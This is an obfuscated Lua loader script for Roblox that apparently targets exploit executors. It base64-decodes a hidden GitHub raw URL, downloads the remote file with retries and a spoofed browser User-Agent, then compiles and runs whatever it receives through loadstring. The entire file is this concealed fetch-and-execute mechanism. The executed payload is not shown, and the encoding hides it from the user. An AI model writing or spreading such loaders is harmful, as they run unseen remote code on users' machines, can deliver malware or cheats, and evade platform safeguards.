if not game:IsLoaded() then
    game.Loaded:Wait()
end

local v1 = game:GetService("Players")
local v2 = v1.LocalPlayer
if not v2 then
    v1:GetPropertyChangedSignal("LocalPlayer"):Wait()
    v2 = v1.LocalPlayer
end

local v3 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
local function v4(v5)
    v5 = string.gsub(v5, '[^'..v3..'=]', '')
    return (v5:gsub('.', function(v6)
        if (v6 == '=') then return '' end
        local v7, v8 = '', (v3:find(v6) - 1)
        for i = 6, 1, -1 do 
            v7 = v7 .. (v8 % 2^i - v8 % 2^(i - 1) > 0 and '1' or '0') 
        end
        return v7
    end):gsub('%d%d%d%d%d%d%d%d', function(v9)
        local v10 = 0
        for i = 1, 8 do 
            v10 = v10 + (v9:sub(i, i) == '1' and 2^(8 - i) or 0) 
        end
        return string.char(v10)
    end))
end

local function v11(v12, v13)
    local v14 = messageboxasync or messagebox
    if type(v14) == "function" then
        pcall(v14, v13, v12, 16)
    else
        warn(v12 .. ": " .. v13)
    end
end

local function v15(v16)
    local v17 = request or http_request or syn.request
    local v18 = loadstring or eloadstring
    if type(v18) ~= "function" then
        v11("Loader Error", "Missing loadstring")
        return nil
    end
    
    local v19 = v4(v16)
    local v20 = nil
    
    for i = 1, 3 do
        local v21 = v19 .. "?t=" .. tostring(math.random(1, 1000000))
        local v22, v23 = pcall(function()
            return game:HttpGet(v21)
        end)
        if v22 and type(v23) == "string" and #v23 > 50000 and not v23:find("<!DOCTYPE html>") then
            v20 = v23
            break
        end
        
        if type(v17) == "function" then
            local v24, v25 = pcall(v17, {
                Url = v21,
                Method = "GET",
                Headers = {
                    ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                    ["Cache-Control"] = "no-cache"
                }
            })
            if v24 and type(v25) == "table" and v25.StatusCode == 200 and type(v25.Body) == "string" then
                if #v25.Body > 50000 and not v25.Body:find("<!DOCTYPE html>") then
                    v20 = v25.Body
                    break
                end
            end
        end
        task.wait(0.5)
    end

    if not v20 then
        v11("Loader Error", "Failed to download complete file.")
        return nil
    end

    local v26, v27 = v18(v20)
    if not v26 then
        v11("Loader Error", tostring(v27))
        return nil
    end
    return v26
end

local v28 = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1NvZnRSYXRhdHVpL3Jpdm1haW4vbWFpbi9yaXZtYWluLmx1YXU="
local v29 = v15(v28)
if v29 then
    task.spawn(v29)
end
